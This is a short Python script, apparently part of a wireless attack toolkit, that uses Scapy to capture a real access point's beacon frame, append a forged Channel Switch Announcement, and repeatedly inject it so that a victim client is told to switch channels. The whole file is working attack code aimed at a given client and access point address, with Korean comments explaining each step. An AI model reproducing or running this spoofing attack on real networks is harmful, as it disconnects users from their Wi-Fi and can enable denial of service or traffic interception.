from scapy.all import conf, sendp, sniff
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltCSA
from cls_collPkt import collPkt
import time

def atkCSA(vicAddr:str, bssAddr:str, loopMax=0, newChannel=100):
    collCls = collPkt()
    collCls.bssid = bssAddr
    sniff(prn=collCls.beaconCapture, stop_filter=collCls.beaconStop)
    # 실제 원본 Beacon Frame 수집
    
    pktCSA = collCls.pktList[0] /\
        Dot11EltCSA(mode=1, new_channel=newChannel, channel_switch_count=1)
    # CSA 필드 추가
 
    conf.verb = 0
    loopCnt = 0
    while(True):
        sendp(pktCSA)
        loopCnt += 1
        print('Beacon Frame with CSA Sent ('+str(loopCnt) +'). (AP='+bssAddr + ' -> CLI='+vicAddr+')')
        if loopMax != 0:
            if loopCnt >= loopMax:
                break
            # loopMax가 지정되면 특정 횟수만 반복
        else:
            time.sleep(0.3)